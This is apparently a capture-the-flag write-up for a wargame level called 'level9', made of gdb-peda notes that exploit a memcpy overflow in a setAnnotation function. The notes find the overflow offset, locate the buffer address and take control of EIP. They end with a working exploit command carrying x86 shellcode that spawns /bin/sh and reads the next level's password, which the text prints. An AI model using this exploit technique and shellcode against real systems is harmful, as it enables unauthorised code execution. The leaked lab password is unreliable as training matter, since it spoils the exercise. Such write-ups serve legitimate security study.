# we call memcpy inside setAnnotation function, so we will try to Buffer Overflow on it
# argv[1] is the parameter of memcpy

gdb-peda$ pattern create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
gdb-peda$ r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
gdb-peda$ pattern search
Registers contain pattern buffer:
EAX+0 found at offset: 108
[...]
# offset = 108

# lets test it
gdb-peda$ r $(python -c 'print "A" * 108 + "CCCC"')
[...]
0x08048682 in main ()
gdb-peda$ i r
eax            0x43434343	0x43434343
ecx            0x43434343	0x43434343
edx            0x804a07c	0x804a07c
ebx            0x804a078	0x804a078
esp            0xbffff670	0xbffff670
ebp            0xbffff698	0xbffff698
esi            0x0	0x0
edi            0x0	0x0
eip            0x8048682	0x8048682 <main+142>
eflags         0x210287	[ CF PF SF IF RF ID ]
cs             0x73	0x73
ss             0x7b	0x7b
ds             0x7b	0x7b
es             0x7b	0x7b
fs             0x0	0x0
gs             0x33	0x33
# let's find the address storing our Buffer.
# we set a breakpoing after the setAnnotation
gdb-peda$ b *main+136
gdb-peda$ r $(python -c "print 'A'*108")
gdb-peda$ x $esp
0xbffff670:	0x0804a008
gdb-peda$ x/50x 0x0804a008
0x804a008:	0x08048848	0x41414141	0x41414141	0x41414141
0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a028:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a038:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a048:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a058:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a068:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a078:	0x08048848	0x00000000	0x00000000	0x00000000
0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a098:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0b8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0c8:	0x00000000	0x00000000
# our A's are displayed 4 bytes after than 0x0804a008
# our string is stored at the address 0x0804a00c.
# so let's see if we can point it to our Aâ€™s to control EIP
# the program puts the address of EAX into EDX, then calls EDX.
# we can modify the call of EDX so that it calls the content of our buffer.
gdb-peda$ r $(python -c 'print "A" * 108 + "\x0c\xa0\x04\x08"')
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$ i r
eax            0x804a078	0x804a078
ecx            0x804a00c	0x804a00c
edx            0x41414141	0x41414141
ebx            0x804a078	0x804a078
esp            0xbffff66c	0xbffff66c
ebp            0xbffff698	0xbffff698
esi            0x0	0x0
edi            0x0	0x0
eip            0x41414141	0x41414141
eflags         0x210287	[ CF PF SF IF RF ID ]
cs             0x73	0x73
ss             0x7b	0x7b
ds             0x7b	0x7b
es             0x7b	0x7b
fs             0x0	0x0
gs             0x33	0x33
gdb-peda$ r $(python -c 'print "CCCC" + "A" * 104 + "\x0c\xa0\x04\x08"')
Stopped reason: SIGSEGV
0x43434343 in ?? ()

# so now we are in control of EIP

./level9 $(python -c 'print "\x0c\xa0\x04\x08" + "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+"A"*51 + "\x0c\xa0\x04\x08"')
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728

